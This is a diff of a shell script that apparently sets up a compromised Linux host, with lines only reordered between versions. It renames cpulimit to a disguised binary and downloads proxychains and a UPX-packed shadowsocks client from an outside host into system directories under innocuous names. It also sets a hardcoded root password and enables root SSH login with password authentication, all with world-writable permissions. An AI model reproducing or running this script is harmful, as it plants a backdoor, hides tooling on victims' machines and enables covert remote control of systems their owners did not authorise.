@@ -32,16 +32,16 @@ sudo cp /usr/bin/cpulimit /usr/bin/timex
 sudo source /etc/profile
 sudo chmod -R 777 /usr/bin/timex
 
-echo root:86E8C9293A458EDF91F02B2C1B613B79 | sudo chpasswd root
-sudo sed -i 's/^.*PermitRootLogin.*/PermitRootLogin yes/g' /etc/ssh/sshd_config;
-sudo sed -i 's/^.*PasswordAuthentication.*/PasswordAuthentication yes/g' /etc/ssh/sshd_config;
-#sudo sed -i 's/^.*Port .*/Port 53000/g' /etc/ssh/sshd_config;
-sudo /etc/init.d/ssh restart
-
 sudo wget down.99.tf/proxychainsng/libproxychains4.so -O /lib64/libproxychains4.so
 sudo wget down.99.tf/proxychainsng/proxychains4 -O /bin/S
 sudo wget down.99.tf/proxychainsng/proxychains.conf -O /bin/proxychains.conf
 sudo wget down.99.tf/ss-local.upx -O /bin/slocal
 sudo chmod -R 777 /bin/S /bin/slocal
+
+echo root:86E8C9293A458EDF91F02B2C1B613B79 | sudo chpasswd root
+sudo sed -i 's/^.*PermitRootLogin.*/PermitRootLogin yes/g' /etc/ssh/sshd_config;
+sudo sed -i 's/^.*PasswordAuthentication.*/PasswordAuthentication yes/g' /etc/ssh/sshd_config;
+#sudo sed -i 's/^.*Port .*/Port 53000/g' /etc/ssh/sshd_config;
+sudo /etc/init.d/ssh restart
 
 sudo /init.sh
